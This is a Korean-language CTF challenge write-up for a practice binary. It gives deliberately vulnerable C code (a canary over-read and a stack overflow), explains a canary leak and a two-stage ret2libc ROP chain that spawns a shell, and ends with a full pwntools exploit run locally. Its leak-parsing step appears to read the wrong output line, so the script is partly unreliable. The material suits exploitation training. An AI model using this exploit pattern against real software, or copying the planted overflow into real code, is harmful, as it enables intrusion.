pwn_canary_easy 문제제작 라이트업
==============

## 개요

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

static void banner(void){
    puts("=== Canary & ROP Playground (easy) ===");
    puts("1) leak canary");
    puts("2) overflow");
    puts("3) exit");
}

static void leak_canary(void){
    char buf[64];
    puts("[+] say something (<=64 bytes):");
    ssize_t n = read(0, buf, sizeof(buf));
    if (n <= 0) exit(1);
    puts("[+] echo with slight over-read (80 bytes) ...");
    /* buf(64) + canary(8) + SFP(8)의 일부까지 노출 */
    write(1, buf, 80);
    puts("");
}

static void vuln(void){
    char buf[64];
    puts("[+] overflow me now:");
    /* Canary가 걸려있으니 정확한 값이 아니면 abort */
    read(0, buf, 256);
    puts("done");
}

int main(void){
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    alarm(120);

    while (1){
        banner();
        printf("> ");
        char sel[8] = {0};
        if (read(0, sel, sizeof(sel)-1) <= 0) return 0;
        switch (atoi(sel)){
            case 1: leak_canary(); break;
            case 2: vuln();        break;
            case 3: puts("bye");   return 0;
            default: puts("?");    break;
        }
    }
    return 0;
}
```

제공하는 바이너리는 Canary가 활성화되어 있어 단순한 반환주소 덮어쓰기가 실패한다.
그러나 Canary 값을 릭할 수 있으며, 이후 Canary를 정확히 되써넣어 BOF를 성공시킬 수 있다.
이후 2단계의 ROP 패턴(함수 주소 릭 → libc base 계산 → `system("/bin/sh")`)으로 쉘을 획득할 수 있다.

---

## 1) 보호기법 확인

```bash
$ checksec --file=./pwn_canary_easy

# Arch: amd64-64-little
# RELRO:    full
# Stack:    canary found
# NX:       enabled
# PIE:      disabled
```

* Canary 있음 → 정확한 우회 필요
* NX 있음 → ROP 필요
* PIE 끔 → 가젯/PLT/GOT 주소가 고정

---

## 2) Canary 릭(메뉴 1)

코드 상 `leak_canary()`는 `read(buf, 64)`로 받은 뒤 \*\*`write(…, 80)`\*\*으로 80바이트를 그대로 내보낸다.
보통 `buf[64]` 바로 뒤에 **8바이트 Canary**가 위치하므로 출력 80바이트 중 **\[64:72]** 구간이 Canary이다.



```text
1            # 메뉴 1 선택
AAAA...x64   # 임의 64바이트 입력
(프로그램이 80바이트 출력 → 끝 16바이트 중 앞 8바이트가 Canary)
```



---

## 3) 1차 ROP로 libc 주소 릭

이제 BOF 수행(메뉴 2). Canary를 정확히 넣고, SFP(saved RBP)를 더미로 채운 뒤,
ROP 체인을 통해 `puts@PLT(puts@GOT)`를 호출 → puts의 실제 libc 주소를 얻는다.
이후 `vuln`으로 복귀해 2차 ROP를 준비한다.


```
padding(64) + canary(8) + SFP(8) +
ret(정렬) +
pop rdi; ret +
&puts@GOT +
&puts@PLT +
&vuln
```

수신한 한 줄을 8바이트 정렬로 채워 `u64`로 복원하면 `puts@libc`가 된다.

---

## 4) libc base 계산

제공된 `libc.so.6`을 pwntools의 `ELF`로 로드한다.

```
libc_base = leaked_puts - libc.symbols['puts']
system = libc.symbols['system']
binsh  = next(libc.search(b"/bin/sh\x00"))
```

이제 필요한 심볼 주소를 계산할 수 있다.

---

## 5) 2차 ROP로 쉘 획득

다시 메뉴 2로 진입해서 같은 방식으로 Canary/SFP를 채우고 최종적으로

```
ret(정렬) +
pop rdi; ret +
&"/bin/sh" +
&system
```

---

## 6) 플래그 읽기

쉘이 뜨면 그대로 cat flag.txt 해서 플래그를 얻어내면 된다.

---------


## 전체 익스플로잇 코드


```python
#!/usr/bin/env python3
from pwn import *
context.binary = ELF("./pwn_canary_easy")
elf = context.binary
libc = ELF("./libc.so.6")         

def start():
    # 로컬 실행
    return process([elf.path])

io = start()

def menu(n):
    io.recvuntil(b"> ")
    io.sendline(str(n).encode())

# 1) canary leak
menu(1)
io.recvuntil(b"(<=64 bytes):\n")
io.send(b"A"*64)
io.recvuntil(b"over-read (80 bytes) ...\n")
leak = io.recvn(80)                # buf(64) + canary(8) + ...
canary = u64(leak[64:72])
log.success(f"canary = {hex(canary)}")

# 2) 1차 ROP: puts(puts@GOT) → vuln 복귀
menu(2)
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi','ret']).address
ret     = rop.find_gadget(['ret']).address

payload  = b"A"*64
payload += p64(canary)             # 정확한 canary
payload += b"B"*8                  # saved RBP
payload += p64(ret)                # stack align
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['vuln'])# 다시 vuln으로

io.sendline(payload)

# puts leak 수신
leaked = io.recvline().strip().ljust(8, b'\x00')
puts_libc = u64(leaked)
log.success(f"puts@libc = {hex(puts_libc)}")

# libc base 계산
libc.address = puts_libc - libc.symbols['puts']
system = libc.symbols['system']
binsh  = next(libc.search(b"/bin/sh\x00"))
log.info(f"libc base = {hex(libc.address)}")
log.info(f"system = {hex(system)}, binsh = {hex(binsh)}")

# 3) 2차 ROP: system("/bin/sh")
menu(2)
payload2  = b"A"*64
payload2 += p64(canary)
payload2 += b"B"*8
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)

io.sendline(payload2)
io.interactive()
```

